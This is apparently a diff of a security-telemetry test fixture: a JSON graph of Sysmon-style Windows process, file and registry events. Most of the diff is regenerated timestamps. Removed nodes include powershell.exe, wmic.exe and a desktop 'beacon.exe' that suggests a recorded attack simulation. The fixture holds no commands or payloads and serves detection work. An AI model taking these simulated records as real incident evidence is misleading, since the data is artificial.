-        "image_hash": "MD5=B31A19BA38F110838119299B50517073,SHA256=D7B378A4BC4DEAE748462D216D14A20CCB1BAC1D3FFBC67711DB2CC1D8B182B7",
-        "command_hash": "85233d2b8e236db5b0b08321e2e548f84e4df58d79f0d4b9d82420ff69ce219b",
-        "event_id": "1",
-        "id": "Process:{8B6011A9-5BAC-618E-5EF3-04000000F101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "win32calc.exe",
-        "name": "win32calc.exe",
-        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5BF3-04000000F101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "File:e56a219e08c86bcf852923b77fe748a7075f1c7baab9faf1d21e8fefbd64d05f:7",
-      "label": "powershell.exe",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436",
-        "parent_process_id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
-        "event_id": "7",
-        "id": "File:e56a219e08c86bcf852923b77fe748a7075f1c7baab9faf1d21e8fefbd64d05f:7",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe"
-      }
-    },
-    {
-      "id": "Registry:213be8e3bfefe1d8001cb922c89361cd2e097483294b30295e260b898d77561e:12",
-      "label": "SCHANNEL",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\SECURITYPROVIDERS",
-        "value_name": "SCHANNEL",
-        "value_data": "CreateKey",
-        "source_image_path": "%system32%\\wbem\\wmic.exe",
-        "parent_process_id": "Process:{8B6011A9-5BAC-618E-61F3-04000000F101}:1",
-        "event_id": "12",
-        "id": "Registry:213be8e3bfefe1d8001cb922c89361cd2e097483294b30295e260b898d77561e:12",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "SCHANNEL",
-        "name": "SCHANNEL"
-      }
-    },
-    {
-      "id": "Registry:b3c1c9d975e9fb2cb3a1d2aa083ce81cbae57b3b737d62ec14834d187dc8cb50:12",
-      "label": "Software Publishing",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "HKU\\%SID%\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\WINTRUST\\TRUST PROVIDERS",
-        "value_name": "Software Publishing",
-        "value_data": "CreateKey",
-        "source_image_path": "%userprofile%\\desktop\\beacon.exe",
-        "parent_process_id": "Process:{8B6011A9-E46E-6165-1E2A-00000000F101}:1",
-        "event_id": "12",
-        "id": "Registry:b3c1c9d975e9fb2cb3a1d2aa083ce81cbae57b3b737d62ec14834d187dc8cb50:12",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "Software Publishing",
-        "name": "Software Publishing"
-      }
-    },
-    {
-      "id": "Registry:0520e2039d4db402bb6a1ec90046c26c5daebb1f613b706ac83a5051ebbb8b02:12",
-      "label": "Local Settings",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "HKU\\S-1-5-21-3946589728-3102711660-3528854901-500_CLASSES",
-        "value_name": "Local Settings",
-        "value_data": "CreateKey",
-        "source_image_path": "%system32%\\calc.exe",
-        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5BF3-04000000F101}:1",
-        "event_id": "12",
-        "id": "Registry:0520e2039d4db402bb6a1ec90046c26c5daebb1f613b706ac83a5051ebbb8b02:12",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "Local Settings",
-        "name": "Local Settings"
+        "display_name": "pshost.132811931248975312.4192.defaultappdomain.powershell",
+        "name": "pshost.132811931248975312.4192.defaultappdomain.powershell"
       }
     }
   ],
@@ -1468,7 +1471,7 @@
       "properties": {
         "action": "Registry Object Create/Delete",
         "event_id": "12",
-        "timestamp": "2026-05-08T17:49:20.255583+00:00"
+        "timestamp": "2026-05-08T21:59:43.745724+00:00"
       }
     },
     {
@@ -1482,7 +1485,7 @@
       "properties": {
         "action": "Network Connection",
         "event_id": "3",
-        "timestamp": "2026-05-08T17:49:20.255583+00:00"
+        "timestamp": "2026-05-08T21:59:43.751426+00:00"
       }
     },
     {
@@ -1496,7 +1499,7 @@
       "properties": {
         "action": "Image Loaded",
         "event_id": "7",
-        "timestamp": "2026-05-08T17:49:20.664763+00:00"
+        "timestamp": "2026-05-08T21:59:44.062465+00:00"
       }
     },
     {
@@ -1510,7 +1513,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:20.673765+00:00"
+        "timestamp": "2026-05-08T21:59:44.062465+00:00"
       }
     },
     {
@@ -1524,7 +1527,7 @@
       "properties": {
         "action": "Pipe Created",
         "event_id": "17",
-        "timestamp": "2026-05-08T17:49:20.688235+00:00"
+        "timestamp": "2026-05-08T21:59:44.077046+00:00"
       }
     },
     {
@@ -1538,7 +1541,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-08T17:49:20.688235+00:00"
+        "timestamp": "2026-05-08T21:59:44.077046+00:00"
       }
     },
     {
@@ -1552,7 +1555,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T17:49:20.711764+00:00"
+        "timestamp": "2026-05-08T21:59:44.088974+00:00"
       }
     },
     {
@@ -1566,7 +1569,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T17:49:20.762319+00:00"
+        "timestamp": "2026-05-08T21:59:44.108844+00:00"
       }
     },
     {
@@ -1580,7 +1583,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:20.788722+00:00"
+        "timestamp": "2026-05-08T21:59:44.141465+00:00"
       }
     },
     {
@@ -1594,7 +1597,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T17:49:20.788722+00:00"
+        "timestamp": "2026-05-08T21:59:44.141465+00:00"
       }
     },
     {
@@ -1608,7 +1611,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-08T17:49:20.788722+00:00"
+        "timestamp": "2026-05-08T21:59:44.141465+00:00"
       }
     },
     {
@@ -1622,7 +1625,7 @@
       "properties": {
         "action": "Pipe Created",
         "event_id": "17",
-        "timestamp": "2026-05-08T17:49:20.806683+00:00"
+        "timestamp": "2026-05-08T21:59:44.151991+00:00"
       }
     },
     {
@@ -1636,7 +1639,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-08T17:49:20.808682+00:00"
+        "timestamp": "2026-05-08T21:59:44.151991+00:00"
       }
     },
     {
@@ -1650,7 +1653,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T17:49:20.821855+00:00"
+        "timestamp": "2026-05-08T21:59:44.155313+00:00"
       }
     },
     {
@@ -1664,7 +1667,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:20.854137+00:00"
+        "timestamp": "2026-05-08T21:59:44.173178+00:00"
       }
     },
     {
@@ -1678,7 +1681,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T17:49:20.855138+00:00"
+        "timestamp": "2026-05-08T21:59:44.173178+00:00"
       }
     },
     {
@@ -1692,7 +1695,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-08T17:49:20.855138+00:00"
+        "timestamp": "2026-05-08T21:59:44.173178+00:00"
       }
     },
     {
@@ -1706,7 +1709,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T17:49:20.866123+00:00"
+        "timestamp": "2026-05-08T21:59:44.187188+00:00"
       }
     },
     {
@@ -1720,7 +1723,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T17:49:20.872124+00:00"
+        "timestamp": "2026-05-08T21:59:44.187188+00:00"
       }
     },
     {
@@ -1734,7 +1737,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-08T17:49:20.872124+00:00"
+        "timestamp": "2026-05-08T21:59:44.187188+00:00"
       }
     },
     {
@@ -1748,7 +1751,7 @@
       "properties": {
         "action": "Pipe Created",
         "event_id": "17",
-        "timestamp": "2026-05-08T17:49:20.872124+00:00"
+        "timestamp": "2026-05-08T21:59:44.187188+00:00"
       }
     },
     {
@@ -1762,7 +1765,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-08T17:49:20.872124+00:00"
+        "timestamp": "2026-05-08T21:59:44.187188+00:00"
       }
     },
     {
@@ -1776,7 +1779,7 @@
       "properties": {
         "action": "Image Loaded",
         "event_id": "7",
-        "timestamp": "2026-05-08T17:49:20.922644+00:00"
+        "timestamp": "2026-05-08T21:59:44.218746+00:00"
       }
     },
     {
@@ -1790,7 +1793,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:20.922644+00:00"
+        "timestamp": "2026-05-08T21:59:44.218746+00:00"
       }
     },
     {
@@ -1804,7 +1807,7 @@
       "properties": {
         "action": "Registry Object Create/Delete",
         "event_id": "12",
-        "timestamp": "2026-05-08T17:49:20.922644+00:00"
+        "timestamp": "2026-05-08T21:59:44.218746+00:00"
       }
     },
     {
@@ -1818,7 +1821,7 @@
       "properties": {
         "action": "Registry Object Create/Delete",
         "event_id": "12",
-        "timestamp": "2026-05-08T17:49:20.922644+00:00"
+        "timestamp": "2026-05-08T21:59:44.218746+00:00"
       }
     },
     {
@@ -1832,7 +1835,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:20.939070+00:00"
+        "timestamp": "2026-05-08T21:59:44.239365+00:00"
       }
     },
     {
@@ -1846,7 +1849,7 @@
       "properties": {
         "action": "Registry Object Create/Delete",
         "event_id": "12",
-        "timestamp": "2026-05-08T17:49:20.939070+00:00"
+        "timestamp": "2026-05-08T21:59:44.239365+00:00"
       }
     },
     {
@@ -1860,7 +1863,7 @@
       "properties": {
         "action": "Image Loaded",
         "event_id": "7",
-        "timestamp": "2026-05-08T17:49:20.939070+00:00"
+        "timestamp": "2026-05-08T21:59:44.239365+00:00"
       }
     },
     {
@@ -1874,7 +1877,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T17:49:20.954624+00:00"
+        "timestamp": "2026-05-08T21:59:44.257866+00:00"
       }
     },
     {
@@ -1888,7 +1891,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:20.988848+00:00"
+        "timestamp": "2026-05-08T21:59:44.266540+00:00"
       }
     },
     {
@@ -1902,7 +1905,7 @@
       "properties": {
         "action": "Registry Object Create/Delete",
         "event_id": "12",
-        "timestamp": "2026-05-08T17:49:21.004650+00:00"
+        "timestamp": "2026-05-08T21:59:44.289106+00:00"
       }
     },
     {
@@ -1916,7 +1919,7 @@
       "properties": {
         "action": "Image Loaded",
         "event_id": "7",
-        "timestamp": "2026-05-08T17:49:21.006672+00:00"
+        "timestamp": "2026-05-08T21:59:44.291115+00:00"
       }
     },
     {
@@ -1930,7 +1933,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:21.010670+00:00"
+        "timestamp": "2026-05-08T21:59:44.295129+00:00"
       }
     },
     {
@@ -1944,7 +1947,7 @@
       "properties": {
         "action": "Image Loaded",
         "event_id": "7",
-        "timestamp": "2026-05-08T17:49:21.012672+00:00"
+        "timestamp": "2026-05-08T21:59:44.295129+00:00"
       }
     },
     {
@@ -1958,7 +1961,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:21.013672+00:00"
+        "timestamp": "2026-05-08T21:59:44.297138+00:00"
       }
     },
     {
@@ -1972,7 +1975,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:21.018214+00:00"
+        "timestamp": "2026-05-08T21:59:44.310480+00:00"
       }
     },
     {
@@ -1986,7 +1989,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:21.023745+00:00"
+        "timestamp": "2026-05-08T21:59:44.315510+00:00"
       }
     },
     {
@@ -2000,7 +2003,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T17:49:21.025759+00:00"
+        "timestamp": "2026-05-08T21:59:44.317408+00:00"
       }
     },
     {
@@ -2014,7 +2017,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T17:49:21.025759+00:00"
+        "timestamp": "2026-05-08T21:59:44.317408+00:00"
       }
     },
     {
@@ -2028,7 +2031,7 @@
       "properties": {
         "action": "Registry Object Create/Delete",
         "event_id": "12",
-        "timestamp": "2026-05-08T17:49:21.034758+00:00"
+        "timestamp": "2026-05-08T21:59:44.317408+00:00"
       }
     },
     {
@@ -2042,7 +2045,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:21.093821+00:00"
+        "timestamp": "2026-05-08T21:59:44.361562+00:00"
       }
     },
     {
@@ -2056,7 +2059,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:21.095832+00:00"
+        "timestamp": "2026-05-08T21:59:44.361562+00:00"
       }
     },
     {
@@ -2070,7 +2073,7 @@
       "properties": {
         "action": "Image Loaded",
         "event_id": "7",
-        "timestamp": "2026-05-08T17:49:21.106725+00:00"
+        "timestamp": "2026-05-08T21:59:44.377833+00:00"
       }
     },
     {
@@ -2084,7 +2087,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T17:49:21.110722+00:00"
+        "timestamp": "2026-05-08T21:59:44.377833+00:00"
       }
     },
     {
@@ -2098,7 +2101,7 @@
       "properties": {
         "action": "Registry Object Create/Delete",
         "event_id": "12",
-        "timestamp": "2026-05-08T17:49:21.110722+00:00"
+        "timestamp": "2026-05-08T21:59:44.377833+00:00"
       }
     },
     {
@@ -2112,7 +2115,7 @@
       "properties": {
         "action": "Registry Object Create/Delete",
         "event_id": "12",
-        "timestamp": "2026-05-08T17:49:21.127925+00:00"
+        "timestamp": "2026-05-08T21:59:44.393857+00:00"
       }
     },
     {
@@ -2126,7 +2129,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:21.127925+00:00"
+        "timestamp": "2026-05-08T21:59:44.393857+00:00"
       }
     },
     {
@@ -2140,7 +2143,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:49:21.127925+00:00"
+        "timestamp": "2026-05-08T21:59:44.393857+00:00"
       }
     },
     {
@@ -2154,7 +2157,7 @@
       "properties": {
         "action": "Registry Object Create/Delete",
         "event_id": "12",
-        "timestamp": "2026-05-08T17:49:21.127925+00:00"
+        "timestamp": "2026-05-08T21:59:44.393857+00:00"
       }
     },
     {
